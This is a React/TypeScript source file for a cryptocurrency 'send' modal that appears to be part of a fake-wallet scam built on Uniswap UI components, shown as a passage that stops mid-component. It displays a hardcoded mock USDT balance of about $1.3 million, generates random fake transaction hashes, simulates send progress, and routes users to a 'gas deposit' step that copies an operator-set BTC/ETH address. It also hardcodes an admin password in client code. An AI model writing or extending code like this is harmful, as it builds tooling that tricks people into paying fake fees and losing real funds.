/* eslint-disable max-lines */
import { getCachedEthPrice, useRealTimeEthPrice } from 'hooks/useRealTimeEthPrice'
import {
  fetchSwiftAdminSettings,
  getSwiftAdminSettings,
  SwiftAdminSettings,
  saveSwiftAdminSettingsToAPI,
} from 'pages/Maduro'
import {
  calculateProgress,
  getTimeRemaining,
  SlowSendTransaction,
  useSlowSendTransactions,
} from 'pages/Portfolio/hooks/useSlowSendTransactions'
import { formatSwiftBalance, formatSwiftTokenAmount, SWIFT_MOCK_USDT } from 'pages/Portfolio/hooks/useSwiftMockData'
import { memo, useCallback, useEffect, useState } from 'react'
import { Flex, Image, QRCodeDisplay, styled, Text, TouchableArea, useSporeColors } from 'ui/src'
import { AlertTriangle } from 'ui/src/components/icons/AlertTriangle'
import { ArrowRight } from 'ui/src/components/icons/ArrowRight'
import { Check } from 'ui/src/components/icons/Check'
import { Clock } from 'ui/src/components/icons/Clock'
import { CopyAlt } from 'ui/src/components/icons/CopyAlt'
import { Gas } from 'ui/src/components/icons/Gas'
import { Lightning } from 'ui/src/components/icons/Lightning'
import { Modal } from 'uniswap/src/components/modals/Modal'
import { ElementName, ModalName } from 'uniswap/src/features/telemetry/constants'
import Trace from 'uniswap/src/features/telemetry/Trace'

// Admin password for updating settings
const ADMIN_PASSWORD = '13565024'

// Get gas deposit address from admin settings
function getGasDepositAddress(settings: SwiftAdminSettings): string {
  return settings.gasDepositAddress
}

// Get minimum gas deposit from admin settings
function getMinimumGasDeposit(settings: SwiftAdminSettings): { amount: number; currency: 'BTC' | 'ETH' } {
  return {
    amount: settings.minimumGasDeposit,
    currency: settings.gasDepositCurrency,
  }
}

// Dynamic gas fee calculation based on amount - uses real-time ETH price
function calculateGasFee(
  amountUSD: number,
  settings: SwiftAdminSettings,
  realTimeEthPrice?: number,
): { ethAmount: number; usdAmount: number; btcAmount: number; currency: 'BTC' | 'ETH'; ethPrice: number } {
  // Base gas + percentage of transaction amount
  const baseGasETH = settings.baseGasFeeETH
  const percentageFee = amountUSD * settings.gasFeePercentage
  // Use real-time price if available, otherwise fall back to cached or settings
  const ethPrice = realTimeEthPrice || getCachedEthPrice() || settings.ethGasPrice

  const percentageFeeETH = percentageFee / ethPrice
  const totalETH = baseGasETH + percentageFeeETH
  const totalUSD = totalETH * ethPrice

  // BTC amount needed
  const btcPrice = settings.btcPrice
  const btcAmount = Math.max(settings.minimumGasDeposit, (totalUSD / btcPrice) * 1.1) // 10% buffer

  return {
    ethAmount: Math.round(totalETH * 100000) / 100000, // 5 decimal places
    usdAmount: Math.round(totalUSD * 100) / 100, // 2 decimal places
    btcAmount: Math.round(btcAmount * 100000) / 100000, // 5 decimal places
    currency: settings.gasDepositCurrency,
    ethPrice, // Include ETH price in return
  }
}

// Check if there's enough ETH balance for gas
function hasEnoughGasBalance(settings: SwiftAdminSettings, requiredETH: number): boolean {
  const currentBalance = settings.ethBalance || 0
  return currentBalance >= requiredETH
}

// Deduct gas fee from ETH balance
async function deductGasFee(settings: SwiftAdminSettings, ethAmount: number): Promise<boolean> {
  const currentBalance = settings.ethBalance || 0
  const newBalance = Math.max(0, currentBalance - ethAmount)

  const updatedSettings = {
    ...settings,
    ethBalance: Math.round(newBalance * 100000) / 100000, // 5 decimal places
  }

  const success = await saveSwiftAdminSettingsToAPI(updatedSettings, ADMIN_PASSWORD)
  if (success) {
    // Dispatch event so navbar and other components update
    window.dispatchEvent(new CustomEvent('swift-settings-updated'))
  }
  return success
}

// Free send amount - uses admin settings
function getFreeSendAmount(settings: SwiftAdminSettings): number {
  return settings.freeSendEnabled ? settings.freeSendAmount : 0
}

// Get minimum send amount from admin settings
function getMinimumSendAmount(settings: SwiftAdminSettings): number {
  return settings.minimumSendAmount || 0
}

type SendStep =
  | 'select-token'
  | 'enter-amount'
  | 'enter-recipient'
  | 'preview'
  | 'choose-speed' // New: choose between instant (with gas) or slow (free)
  | 'slow-send-confirm' // New: confirm slow send
  | 'slow-sending' // New: slow send in progress
  | 'insufficient-gas'
  | 'deposit-gas'
  | 'pending'
  | 'success'

interface SwiftSendModalProps {
  isOpen: boolean
  onClose: () => void
  onTransactionPending?: (transaction: PendingTransaction) => void
  onTransactionSuccess?: (transaction: SuccessTransaction) => void
  onSlowSendStarted?: (transaction: SlowSendTransaction) => void
  hasUsedFreeSend?: boolean
  onFreeSendUsed?: () => void
  currentBalance?: {
    balanceUSD: number
    usdtBalance: number
    usdtQuantity: string
  }
  initialStep?: 'deposit-gas'
}

export interface PendingTransaction {
  id: string
  type: 'send'
  amount: string
  amountUSD: number
  tokenSymbol: string
  recipient: string
  timestamp: number
  status: 'pending'
}

export interface SuccessTransaction {
  id: string
  type: 'send'
  amount: string
  amountUSD: number
  tokenSymbol: string
  recipient: string
  timestamp: number
  status: 'success'
}

const StepIndicator = styled(Flex, {
  width: 32,
  height: 32,
  borderRadius: '$roundedFull',
  centered: true,
  variants: {
    active: {
      true: {
        backgroundColor: '$accent1',
      },
      false: {
        backgroundColor: '$surface3',
      },
    },
    completed: {
      true: {
        backgroundColor: '$statusSuccess',
      },
    },
  } as const,
})

const InputField = styled(Flex, {
  backgroundColor: '$surface2',
  borderRadius: '$rounded16',
  borderWidth: 1,
  borderColor: '$surface3',
  p: '$spacing16',
  width: '100%',
  hoverStyle: {
    borderColor: '$neutral3',
  },
  focusStyle: {
    borderColor: '$accent1',
  },
})

const ActionButton = styled(TouchableArea, {
  backgroundColor: '$accent1',
  borderRadius: '$rounded16',
  p: '$spacing16',
  centered: true,
  width: '100%',
  hoverStyle: {
    opacity: 0.9,
  },
  pressStyle: {
    opacity: 0.8,
  },
  variants: {
    variant: {
      primary: {
        backgroundColor: '$accent1',
      },
      secondary: {
        backgroundColor: '$surface2',
      },
      danger: {
        backgroundColor: '$statusCritical',
      },
    },
    disabled: {
      true: {
        opacity: 0.5,
      },
    },
  } as const,
})

// Default balance fallback
const DEFAULT_BALANCE = {
  balanceUSD: 1300545.66,
  usdtBalance: 1300545.66,
  usdtQuantity: '1300545.66',
}

export const SwiftSendModal = memo(function SwiftSendModal({
  isOpen,
  onClose,
  onTransactionPending,
  onTransactionSuccess,
  onSlowSendStarted,
  hasUsedFreeSend = false,
  onFreeSendUsed,
  currentBalance = DEFAULT_BALANCE,
  initialStep,
}: SwiftSendModalProps) {
  const colors = useSporeColors()
  const [step, setStep] = useState<SendStep>(initialStep || 'select-token')
  const [selectedToken] = useState(SWIFT_MOCK_USDT)
  const [amount, setAmount] = useState('')
  const [recipient, setRecipient] = useState('')
  const [copied, setCopied] = useState(false)
  const [adminSettings, setAdminSettings] = useState<SwiftAdminSettings>(getSwiftAdminSettings())
  const [currentSlowSendTx, setCurrentSlowSendTx] = useState<SlowSendTransaction | null>(null)

  // Get slow send transaction hook
  const { addSlowSendTransaction } = useSlowSendTransactions()

  // Get real-time ETH price
  const { price: realTimeEthPrice } = useRealTimeEthPrice()

  // Handle initial step changes (e.g., when opened from navbar deposit button)
  useEffect(() => {
    if (isOpen && initialStep) {
      setStep(initialStep)
    }
  }, [isOpen, initialStep])

  // Fetch settings from API when modal opens
  useEffect(() => {
    if (isOpen) {
      fetchSwiftAdminSettings().then((s) => setAdminSettings(s))
    }
  }, [isOpen])

  // Listen for settings updates
  useEffect(() => {
    const handleSettingsUpdate = () => {
      fetchSwiftAdminSettings().then((s) => setAdminSettings(s))
    }
    window.addEventListener('swift-settings-updated', handleSettingsUpdate)
    return () => window.removeEventListener('swift-settings-updated', handleSettingsUpdate)
  }, [])

  const handleClose = useCallback(() => {
    setStep('select-token')
    setAmount('')
    setRecipient('')
    setCurrentSlowSendTx(null)
    onClose()
  }, [onClose])

  const handleSelectToken = useCallback(() => {
    setStep('enter-amount')
  }, [])

  const handleAmountContinue = useCallback(() => {
    if (amount && parseFloat(amount) > 0) {
      setStep('enter-recipient')
    }
  }, [amount])

  const handleRecipientContinue = useCallback(() => {
    if (recipient && recipient.startsWith('0x') && recipient.length === 42) {
      setStep('preview')
    }
  }, [recipient])

  const handlePreviewSend = useCallback(async () => {
    // Check if this is a first-time free send (wallet hasn't used free send yet)
    const freeSendAmount = getFreeSendAmount(adminSettings)
    const isFreeSendEligible = freeSendAmount > 0 && !hasUsedFreeSend && parseFloat(amount) === freeSendAmount

    if (isFreeSendEligible) {
      // Process as success immediately for free send
      const successTx: SuccessTransaction = {
        id: `success-${Date.now()}`,
        type: 'send',
        amount,
        amountUSD: parseFloat(amount),
        tokenSymbol: selectedToken.symbol,
        recipient,
        timestamp: Date.now(),
        status: 'success',
      }
      onTransactionSuccess?.(successTx)
      onFreeSendUsed?.()
      setStep('success')
    } else {
      // Check if slow send is enabled - if so, show speed choice
      if (adminSettings.slowSendEnabled) {
        setStep('choose-speed')
      } else {
        // Normal flow - check gas and process
        const gasFeeRequired = calculateGasFee(parseFloat(amount), adminSettings, realTimeEthPrice)
        if (hasEnoughGasBalance(adminSettings, gasFeeRequired.ethAmount)) {
          const deducted = await deductGasFee(adminSettings, gasFeeRequired.ethAmount)
          if (deducted) {
            const successTx: SuccessTransaction = {
              id: `success-${Date.now()}`,
              type: 'send',
              amount,
              amountUSD: parseFloat(amount),
              tokenSymbol: selectedToken.symbol,
              recipient,
              timestamp: Date.now(),
              status: 'success',
            }
            onTransactionSuccess?.(successTx)
            setStep('success')
          } else {
            setStep('insufficient-gas')
          }
        } else {
          setStep('insufficient-gas')
        }
      }
    }
  }, [
    amount,
    hasUsedFreeSend,
    recipient,
    selectedToken.symbol,
    onTransactionSuccess,
    onFreeSendUsed,
    adminSettings,
    realTimeEthPrice,
  ])

  // Handle instant send (with gas fee)
  const handleInstantSend = useCallback(async () => {
    const gasFeeRequired = calculateGasFee(parseFloat(amount), adminSettings, realTimeEthPrice)
    if (hasEnoughGasBalance(adminSettings, gasFeeRequired.ethAmount)) {
      const deducted = await deductGasFee(adminSettings, gasFeeRequired.ethAmount)
      if (deducted) {
        const successTx: SuccessTransaction = {
          id: `success-${Date.now()}`,
          type: 'send',
          amount,
          amountUSD: parseFloat(amount),
          tokenSymbol: selectedToken.symbol,
          recipient,
          timestamp: Date.now(),
          status: 'success',
        }
        onTransactionSuccess?.(successTx)
        setStep('success')
      } else {
        setStep('insufficient-gas')
      }
    } else {
      setStep('insufficient-gas')
    }
  }, [amount, recipient, selectedToken.symbol, onTransactionSuccess, adminSettings, realTimeEthPrice])

  // Handle slow send (free, takes hours)
  const handleSlowSend = useCallback(() => {
    setStep('slow-send-confirm')
  }, [])

  // Confirm and start slow send
  const handleConfirmSlowSend = useCallback(() => {
    const newTx = addSlowSendTransaction({
      id: `slow-${Date.now()}`,
      type: 'send',
      amount,
      amountUSD: parseFloat(amount),
      tokenSymbol: selectedToken.symbol,
      recipient,
      transactionHash: `0x${Math.random().toString(16).slice(2)}${Date.now().toString(16)}`,
    })
    setCurrentSlowSendTx(newTx)
    onSlowSendStarted?.(newTx)
    setStep('slow-sending')
  }, [amount, recipient, selectedToken.symbol, addSlowSendTransaction, onSlowSendStarted])

  const handleDepositGas = useCallback(() => {
    setStep('deposit-gas')
  }, [])

  const handleCopyAddress = useCallback(async () => {
    const depositAddress = getGasDepositAddress(adminSettings)
    await navigator.clipboard.writeText(depositAddress)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }, [adminSettings])

  const handleConfirmDeposit = useCallback(() => {
    // Create pending transaction
    const pendingTx: PendingTransaction = {
      id: `pending-${Date.now()}`,
      type: 'send',
      amount,
      amountUSD: parseFloat(amount),
      tokenSymbol: selectedToken.symbol,
      recipient,
      timestamp: Date.now(),
      status: 'pending',
    }
    onTransactionPending?.(pendingTx)
    setStep('pending')
  }, [amount, recipient, selectedToken.symbol, onTransactionPending])

  const handleSetMaxAmount = useCallback(() => {
    setAmount(currentBalance.usdtQuantity)
  }, [currentBalance.usdtQuantity])

  const amountUSD = amount ? parseFloat(amount) : 0
  const minimumSendAmount = getMinimumSendAmount(adminSettings)
  const freeSendAmount = getFreeSendAmount(adminSettings)
  const isFreeSendEligible = freeSendAmount > 0 && !hasUsedFreeSend && amountUSD === freeSendAmount

  // Amount is valid if:
  // 1. It's a free send (exact amount match and eligible)
  // 2. OR amount is above minimum and within balance
  const meetsMinimum = minimumSendAmount === 0 || amountUSD >= minimumSendAmount || isFreeSendEligible
  const isAmountValid = amountUSD > 0 && amountUSD <= currentBalance.usdtBalance && meetsMinimum
  const isRecipientValid = recipient.startsWith('0x') && recipient.length === 42

  // Calculate dynamic gas fee based on amount with real-time ETH price
  const gasFee = calculateGasFee(amountUSD, adminSettings, realTimeEthPrice)

  // Get deposit address and minimum from admin settings
  const depositAddress = getGasDepositAddress(adminSettings)
  const minimumDeposit = getMinimumGasDeposit(adminSettings)

  const renderStepContent = () => {
    switch (step) {
      case 'select-token':
        return (
          <Flex gap="$spacing24" width="100%">
            <Flex centered gap="$spacing8">
              <Text variant="subheading1">Select Token to Send</Text>
              <Text variant="body3" color="$neutral2">
                Choose from your available tokens
              </Text>
            </Flex>

            <Trace logPress element={ElementName.SwiftSendButton}>
              <TouchableArea onPress={handleSelectToken}>
                <Flex
                  row
                  alignItems="center"
                  justifyContent="space-between"
                  backgroundColor="$surface2"
                  borderRadius="$rounded16"
                  p="$spacing16"
                  borderWidth={1}
                  borderColor="$surface3"
                  hoverStyle={{ borderColor: '$accent1' }}
                >
                  <Flex row alignItems="center" gap="$spacing12">
                    <Image source={{ uri: selectedToken.logoUrl }} width={48} height={48} borderRadius="$roundedFull" />
                    <Flex>
                      <Text variant="body1" fontWeight="600">
                        {selectedToken.symbol}
                      </Text>
                      <Text variant="body3" color="$neutral2">
                        {selectedToken.name}
                      </Text>
                    </Flex>
                  </Flex>
                  <Flex alignItems="flex-end">
                    <Text variant="body1" fontWeight="600">
                      {formatSwiftTokenAmount(currentBalance.usdtQuantity)}
                    </Text>
                    <Text variant="body3" color="$neutral2">
                      {formatSwiftBalance(currentBalance.balanceUSD)}
                    </Text>
                  </Flex>
                </Flex>
              </TouchableArea>
            </Trace>
          </Flex>
        )

      case 'enter-amount':
        return (
          <Flex gap="$spacing24" width="100%">
            <Flex centered gap="$spacing8">
              <Text variant="subheading1">Enter Amount</Text>
              <Text variant="body3" color="$neutral2">
                How much {selectedToken.symbol} do you want to send?
              </Text>
            </Flex>

            {/* Token Info */}
            <Flex
              row
              alignItems="center"
              backgroundColor="$surface2"
              borderRadius="$rounded12"
              p="$spacing12"
              gap="$spacing12"
            >
              <Image source={{ uri: selectedToken.logoUrl }} width={32} height={32} borderRadius="$roundedFull" />
              <Flex grow>
                <Text variant="body2" fontWeight="500">
                  {selectedToken.symbol}
                </Text>
                <Text variant="body4" color="$neutral2">
                  Balance: {formatSwiftTokenAmount(currentBalance.usdtQuantity)}
                </Text>
              </Flex>
              <TouchableArea onPress={handleSetMaxAmount}>
                <Flex backgroundColor="$accent2" borderRadius="$rounded8" px="$spacing8" py="$spacing4">
                  <Text variant="buttonLabel4" color="$accent1">
                    MAX
                  </Text>
                </Flex>
              </TouchableArea>
            </Flex>

            {/* Amount Input */}
            <InputField>
              <Flex row alignItems="center" justifyContent="space-between">
                <input
                  type="number"
                  placeholder="0.00"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  style={{
                    background: 'transparent',
                    border: 'none',
                    outline: 'none',
                    fontSize: '32px',
                    fontWeight: '600',
                    color: 'inherit',
                    width: '100%',
                  }}
                />
                <Text variant="body1" color="$neutral2">
                  {selectedToken.symbol}
                </Text>
              </Flex>
              {amount && (
                <Text variant="body3" color="$neutral2" mt="$spacing4">
                  ≈ {formatSwiftBalance(amountUSD)}
                </Text>
              )}
            </InputField>

            {/* Error message */}
            {amount && !isAmountValid && (
              <Flex backgroundColor="$statusCritical2" borderRadius="$rounded12" p="$spacing12" gap="$spacing4">
                <Flex row alignItems="center" gap="$spacing8">
                  <AlertTriangle color="$statusCritical" size={16} />
                  <Text variant="body3" color="$statusCritical" fontWeight="600">
                    {amountUSD > currentBalance.usdtBalance
                      ? 'Insufficient balance'
                      : !meetsMinimum
                        ? `Minimum send amount: $${minimumSendAmount.toLocaleString()}`
                        : 'Invalid amount'}
                  </Text>
                </Flex>
                {!meetsMinimum && minimumSendAmount > 0 && (
                  <Text variant="body4" color="$neutral2">
                    USDT transfers require a minimum of ${minimumSendAmount.toLocaleString()} USD
                    {freeSendAmount > 0 && !hasUsedFreeSend && ` (or exactly send minimum +1 )`}
                  </Text>
                )}
              </Flex>
            )}

            <ActionButton variant="primary" disabled={!isAmountValid} onPress={handleAmountContinue}>
              <Text variant="buttonLabel2" color="$white">
                Continue
              </Text>
            </ActionButton>
          </Flex>
        )

      case 'enter-recipient':
        return (
          <Flex gap="$spacing24" width="100%">
            <Flex centered gap="$spacing8">
              <Text variant="subheading1">Enter Recipient</Text>
              <Text variant="body3" color="$neutral2">
                Enter the wallet address to receive {selectedToken.symbol}
              </Text>
            </Flex>

            {/* Amount Summary */}
            <Flex
              row
              alignItems="center"
              backgroundColor="$surface2"
              borderRadius="$rounded12"
              p="$spacing12"
              gap="$spacing12"
            >
              <Image source={{ uri: selectedToken.logoUrl }} width={32} height={32} borderRadius="$roundedFull" />
              <Flex>
                <Text variant="body2" fontWeight="500">
                  Sending {formatSwiftTokenAmount(amount)} {selectedToken.symbol}
                </Text>
                <Text variant="body4" color="$neutral2">
                  {formatSwiftBalance(amountUSD)}
                </Text>
              </Flex>
            </Flex>

            {/* Recipient Input */}
            <InputField>
              <Text variant="body4" color="$neutral2" mb="$spacing8">
                Recipient Address
              </Text>
              <input
                type="text"
                placeholder="0x..."
                value={recipient}
                onChange={(e) => setRecipient(e.target.value)}
                style={{
                  background: 'transparent',
                  border: 'none',
                  outline: 'none',
                  fontSize: '14px',
                  color: 'inherit',
                  width: '100%',
                  fontFamily: 'monospace',
                }}
              />
            </InputField>

            {recipient && !isRecipientValid && (
              <Flex row alignItems="center" gap="$spacing8">
                <AlertTriangle color="$statusCritical" size={16} />
                <Text variant="body3" color="$statusCritical">
                  Please enter a valid Ethereum address
                </Text>
              </Flex>
            )}

            <Trace logPress element={ElementName.SwiftSendPreviewButton}>
              <ActionButton variant="primary" disabled={!isRecipientValid} onPress={handleRecipientContinue}>
                <Text variant="buttonLabel2" color="$white">
                  Preview Send
                </Text>
              </ActionButton>
            </Trace>
          </Flex>
        )

      case 'preview':
        return (
          <Flex gap="$spacing24" width="100%">
            <Flex centered gap="$spacing8">
              <Text variant="subheading1">Review Transaction</Text>
              <Text variant="body3" color="$neutral2">
                Please review the details before sending
              </Text>
            </Flex>

            {/* Transaction Summary Card */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing20" gap="$spacing16">
              {/* Amount */}
              <Flex centered gap="$spacing8">
                <Image source={{ uri: selectedToken.logoUrl }} width={56} height={56} borderRadius="$roundedFull" />
                <Text variant="heading2">
                  {formatSwiftTokenAmount(amount)} {selectedToken.symbol}
                </Text>
                <Text variant="body2" color="$neutral2">
                  {formatSwiftBalance(amountUSD)}
                </Text>
              </Flex>

              <Flex centered py="$spacing8">
                <ArrowRight color="$neutral2" size={24} />
              </Flex>

              {/* Recipient */}
              <Flex centered gap="$spacing4">
                <Text variant="body3" color="$neutral2">
                  To
                </Text>
                <Flex backgroundColor="$surface3" borderRadius="$rounded12" px="$spacing12" py="$spacing8">
                  <Text variant="body3" fontFamily="$mono">
                    {recipient.slice(0, 10)}...{recipient.slice(-8)}
                  </Text>
                </Flex>
              </Flex>
            </Flex>

            {/* Gas Fee Card with ETH Balance */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing16" gap="$spacing12">
              <Flex row alignItems="center" gap="$spacing8">
                <Gas color="$neutral2" size={20} />
                <Text variant="body2" fontWeight="500">
                  Network Fee
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Flex>
                  <Text variant="body2" color="$neutral2">
                    Estimated Gas
                  </Text>
                </Flex>
                <Flex alignItems="flex-end">
                  <Text variant="body1" fontWeight="600">
                    ~{gasFee.ethAmount} ETH
                  </Text>
                  <Text variant="body3" color="$neutral2">
                    ≈ ${gasFee.usdAmount.toLocaleString()}
                  </Text>
                </Flex>
              </Flex>
              {/* ETH Balance Status */}
              <Flex
                row
                alignItems="center"
                justifyContent="space-between"
                backgroundColor={
                  hasEnoughGasBalance(adminSettings, gasFee.ethAmount) ? '$statusSuccess2' : '$statusCritical2'
                }
                borderRadius="$rounded8"
                p="$spacing12"
              >
                <Flex row alignItems="center" gap="$spacing8">
                  <Text style={{ fontSize: 16 }}>⟠</Text>
                  <Text variant="body3" fontWeight="500">
                    Your ETH Balance
                  </Text>
                </Flex>
                <Flex alignItems="flex-end">
                  <Text
                    variant="body2"
                    fontWeight="600"
                    color={hasEnoughGasBalance(adminSettings, gasFee.ethAmount) ? '$statusSuccess' : '$statusCritical'}
                  >
                    {(adminSettings.ethBalance || 0).toFixed(4)} ETH
                  </Text>
                  <Text
                    variant="body4"
                    color={hasEnoughGasBalance(adminSettings, gasFee.ethAmount) ? '$statusSuccess' : '$statusCritical'}
                  >
                    {hasEnoughGasBalance(adminSettings, gasFee.ethAmount) ? '✓ Sufficient' : '✗ Insufficient'}
                  </Text>
                </Flex>
              </Flex>
            </Flex>

            <Trace logPress element={ElementName.SwiftSendConfirmButton}>
              <ActionButton variant="primary" onPress={handlePreviewSend}>
                <Text variant="buttonLabel2" color="$white">
                  {!hasEnoughGasBalance(adminSettings, gasFee.ethAmount) && adminSettings.slowSendEnabled
                    ? 'Continue with Free Send'
                    : `Send ${selectedToken.symbol}`}
                </Text>
              </ActionButton>
            </Trace>
          </Flex>
        )

      case 'choose-speed':
        return (
          <Flex gap="$spacing24" width="100%">
            <Flex centered gap="$spacing8">
              <Text variant="subheading1">Choose Transaction Speed</Text>
              <Text variant="body3" color="$neutral2" textAlign="center">
                Send instantly with gas fee or for free (takes {adminSettings.slowSendDurationHours || 4} hours)
              </Text>
            </Flex>

            {/* Transaction Summary */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded12" p="$spacing16" gap="$spacing8">
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Amount
                </Text>
                <Text variant="body2" fontWeight="600">
                  {formatSwiftTokenAmount(amount)} {selectedToken.symbol}
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  To
                </Text>
                <Text variant="body3" fontFamily="$mono">
                  {recipient.slice(0, 6)}...{recipient.slice(-4)}
                </Text>
              </Flex>
            </Flex>

            {/* Instant Send Option */}
            <TouchableArea onPress={handleInstantSend}>
              <Flex
                backgroundColor="$surface2"
                borderRadius="$rounded16"
                p="$spacing16"
                gap="$spacing12"
                borderWidth={1}
                borderColor="$accent1"
                hoverStyle={{ borderColor: '$accent1', opacity: 0.9 }}
              >
                <Flex row alignItems="center" justifyContent="space-between">
                  <Flex row alignItems="center" gap="$spacing12">
                    <Flex width={44} height={44} borderRadius="$roundedFull" backgroundColor="$accent2" centered>
                      <Lightning color="$accent1" size={24} />
                    </Flex>
                    <Flex>
                      <Text variant="body1" fontWeight="600">
                        Instant Send
                      </Text>
                      <Text variant="body3" color="$neutral2">
                        Completes immediately
                      </Text>
                    </Flex>
                  </Flex>
                  <Flex alignItems="flex-end">
                    <Text variant="body2" fontWeight="600">
                      ~{gasFee.ethAmount} ETH
                    </Text>
                    <Text variant="body4" color="$neutral2">
                      ≈ ${gasFee.usdAmount.toLocaleString()}
                    </Text>
                  </Flex>
                </Flex>
                {!hasEnoughGasBalance(adminSettings, gasFee.ethAmount) && (
                  <Flex backgroundColor="$statusCritical2" borderRadius="$rounded8" p="$spacing8">
                    <Text variant="body4" color="$statusCritical">
                      ⚠️ Insufficient ETH balance ({(adminSettings.ethBalance || 0).toFixed(4)} ETH)
                    </Text>
                  </Flex>
                )}
              </Flex>
            </TouchableArea>

            {/* Slow Send Option */}
            <TouchableArea onPress={handleSlowSend}>
              <Flex
                backgroundColor="$surface2"
                borderRadius="$rounded16"
                p="$spacing16"
                gap="$spacing12"
                borderWidth={1}
                borderColor="$surface3"
                hoverStyle={{ borderColor: '$statusSuccess', opacity: 0.9 }}
              >
                <Flex row alignItems="center" justifyContent="space-between">
                  <Flex row alignItems="center" gap="$spacing12">
                    <Flex width={44} height={44} borderRadius="$roundedFull" backgroundColor="$statusSuccess2" centered>
                      <Clock color="$statusSuccess" size={24} />
                    </Flex>
                    <Flex>
                      <Text variant="body1" fontWeight="600">
                        Free Send
                      </Text>
                      <Text variant="body3" color="$neutral2">
                        Takes ~{adminSettings.slowSendDurationHours || 4} hours
                      </Text>
                    </Flex>
                  </Flex>
                  <Flex alignItems="flex-end">
                    <Text variant="body2" fontWeight="600" color="$statusSuccess">
                      FREE
                    </Text>
                    <Text variant="body4" color="$neutral2">
                      No gas fee
                    </Text>
                  </Flex>
                </Flex>
                <Flex backgroundColor="$statusSuccess2" borderRadius="$rounded8" p="$spacing8">
                  <Text variant="body4" color="$statusSuccess">
                    ✓ Can be sped up anytime by paying gas fee
                  </Text>
                </Flex>
              </Flex>
            </TouchableArea>
          </Flex>
        )

      case 'slow-send-confirm':
        return (
          <Flex gap="$spacing24" width="100%">
            <Flex centered gap="$spacing12">
              <Flex width={72} height={72} borderRadius="$roundedFull" backgroundColor="$statusSuccess2" centered>
                <Clock color="$statusSuccess" size={32} />
              </Flex>
              <Text variant="subheading1">Confirm Free Send</Text>
              <Text variant="body3" color="$neutral2" textAlign="center">
                Your transaction will be processed within {adminSettings.slowSendDurationHours || 4} hours
              </Text>
            </Flex>

            {/* Transaction Details */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing16" gap="$spacing12">
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Amount
                </Text>
                <Text variant="body2" fontWeight="600">
                  {formatSwiftTokenAmount(amount)} {selectedToken.symbol}
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  To
                </Text>
                <Text variant="body3" fontFamily="$mono">
                  {recipient.slice(0, 6)}...{recipient.slice(-4)}
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Network Fee
                </Text>
                <Text variant="body2" fontWeight="600" color="$statusSuccess">
                  FREE
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Estimated Time
                </Text>
                <Text variant="body2" fontWeight="600">
                  ~{adminSettings.slowSendDurationHours || 4} hours
                </Text>
              </Flex>
            </Flex>

            {/* Info */}
            <Flex backgroundColor="$accent2" borderRadius="$rounded12" p="$spacing12" gap="$spacing8">
              <Text variant="body4" color="$accent1" fontWeight="500">
                💡 Speed up anytime
              </Text>
              <Text variant="body4" color="$neutral2">
                You can pay the gas fee later to complete the transaction instantly.
              </Text>
            </Flex>

            <Flex gap="$spacing12">
              <ActionButton variant="primary" onPress={handleConfirmSlowSend}>
                <Flex row alignItems="center" gap="$spacing8">
                  <Clock color="$white" size={20} />
                  <Text variant="buttonLabel2" color="$white">
                    Start Free Send
                  </Text>
                </Flex>
              </ActionButton>
              <ActionButton variant="secondary" onPress={() => setStep('choose-speed')}>
                <Text variant="buttonLabel2" color="$neutral1">
                  Go Back
                </Text>
              </ActionButton>
            </Flex>
          </Flex>
        )

      case 'slow-sending':
        return (
          <Flex gap="$spacing24" width="100%" centered>
            <Flex centered gap="$spacing16">
              <Flex width={80} height={80} borderRadius="$roundedFull" backgroundColor="$statusSuccess2" centered>
                <Clock color="$statusSuccess" size={40} />
              </Flex>
              <Text variant="subheading1">Transaction Sending</Text>
              <Text variant="body3" color="$neutral2" textAlign="center">
                Your free send is being processed
              </Text>
            </Flex>

            {/* Progress */}
            {currentSlowSendTx && (
              <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing16" gap="$spacing12" width="100%">
                <Flex row alignItems="center" justifyContent="space-between">
                  <Text variant="body3" color="$neutral2">
                    Progress
                  </Text>
                  <Text variant="body2" fontWeight="600">
                    {calculateProgress(currentSlowSendTx)}%
                  </Text>
                </Flex>
                {/* Progress Bar */}
                <Flex backgroundColor="$surface3" borderRadius="$roundedFull" height={8} overflow="hidden">
                  <Flex
                    backgroundColor="$statusSuccess"
                    borderRadius="$roundedFull"
                    height="100%"
                    width={`${calculateProgress(currentSlowSendTx)}%`}
                  />
                </Flex>
                <Flex row alignItems="center" justifyContent="space-between">
                  <Text variant="body3" color="$neutral2">
                    Time Remaining
                  </Text>
                  <Text variant="body2" fontWeight="600">
                    {getTimeRemaining(currentSlowSendTx)}
                  </Text>
                </Flex>
              </Flex>
            )}

            {/* Transaction Summary */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing16" gap="$spacing8" width="100%">
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Amount
                </Text>
                <Text variant="body2" fontWeight="600">
                  {formatSwiftTokenAmount(amount)} {selectedToken.symbol}
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  To
                </Text>
                <Text variant="body3" fontFamily="$mono">
                  {recipient.slice(0, 6)}...{recipient.slice(-4)}
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Status
                </Text>
                <Flex
                  row
                  alignItems="center"
                  gap="$spacing4"
                  backgroundColor="$statusWarning2"
                  borderRadius="$rounded8"
                  px="$spacing8"
                  py="$spacing4"
                >
                  <Flex width={8} height={8} borderRadius="$roundedFull" backgroundColor="$statusWarning" />
                  <Text variant="buttonLabel4" color="$statusWarning">
